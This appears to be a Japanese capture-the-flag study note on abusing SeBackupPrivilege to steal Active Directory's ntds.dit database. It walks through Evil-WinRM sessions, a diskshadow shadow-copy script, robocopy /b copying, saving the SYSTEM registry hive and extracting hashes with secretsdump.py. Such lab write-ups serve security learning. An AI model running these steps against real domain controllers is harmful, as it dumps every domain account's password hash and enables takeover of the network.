## ntds.ditとは？
- **ドメインコントローラーの中でも最も重要なデータベースファイル**
- All data in Active Directory is stored in the file **ntds.dit** (by default located in `C:\Windows\NTDS\`) on every domain controller. (c.f.[Ntds.dit Password Extraction(stealthbits)](https://attack.stealthbits.com/ntds-dit-security-active-directory))
- Admin権限 or **backupユーザー** であれば見れるかも
- **SeBackupPrivilege**が読むことを、**SeRestorePrivilege**が書き込むこと、この二つの権限があれば良い。
- ntds.ditの存在場所：**C:\Windows\NTDS\ntds.dit**
- NTDSファイルをdecryptするためにはkeyが必要で、そのkeyは**system registry hive**なるレジストリに含まれている。-> `reg save hklm\system c:\temp\system`


c.f.)
- 複数のやり方が書いてある -> [Tha Hacker Recipies](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds)
- 実際にうまく動いた -> [Windows PrivEsc with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)

**SeBackupPrivilege**がある：

```
*Evil-WinRM* PS C:\Users\svc_backup> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

# 一番手っ取り早い方法

[このスクリプト](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)を使う：


![change_permission](https://user-images.githubusercontent.com/85237728/149320232-492d553b-6219-4981-b06c-5a81d6d61cac.png)


`whoami`でsystemとは出ないが、確かにroot.txtが読めた。



# 実際にやってみた（参考：[Windows PrivEsc with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)）

ntds.ditのコピーにおいて、普通の`copy`コマンドではpermission deniedになってしまう。そこで`robocopy`を使う。特に`/b`（または`/B`）フラグで**バックアップとして**コピーができる。つまりAdmin権限がなくても、backupユーザの権限があればpermission deniedにならない（[robocopyについての詳細](https://n-archives.net/software/robosync/articles/robocopy-specs-and-command/#i-3-1)）

*注）先に`mkdir C:\temp`として一時的なディレクトリを作っておく*

-> しかし`PS C:\temp> roboropy C:\Windoes\NTDS\ntds.dit . ntds.dit`というふうに直接コピーすると、現在アクティブなのでコピーできないと言われる。

-> そこで新しいドライブを作り、`diskshadow`でドライブ間のコピーを行うという方法をとる

（スクリプト）

```
┌──(kali㉿kali)-[~]
└─$ cat back_script.txt
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

- スクリプトターゲット上にアップロード（遅かったらsmb使おう）：

```
*Evil-WinRM* PS C:\Users\svc_backup\Downloads> upload /home/kali/back_scrip.txt
```

- `diskshadow`コマンドにスクリプトを指定して実行：

```
*Evil-WinRM* PS C:\Users\svc_backup\Downloads> diskshadow /s back_script.txt
```

これで E:\ ドライブに C:\ ドライブの内容がコピーされた。E:\は現在アクティブじゃないから、`robocopy`が使える：

```
*Evil-WinRM* PS E:\> cd C:\ 
*Evil-WinRM* PS C:\> mkdir tmp
*Evil-WinRM* PS C:\> cd tmp
*Evil-WinRM* PS C:\temp> robocopy /b E:\Windows\ntds . ntds.dit
```

- ntds.ditの復号にはレジストリのキーが必要なのでそれをロードする：

```
*Evil-WinRM* PS C:\temp> reg save hklm\system c:\temp\system
```

その後**ntds.dit**と**system**をKaliに転送する。

Kali上でcrack：

```
secretsdump.py -system system -ntds ntds.dit LOCAL
```
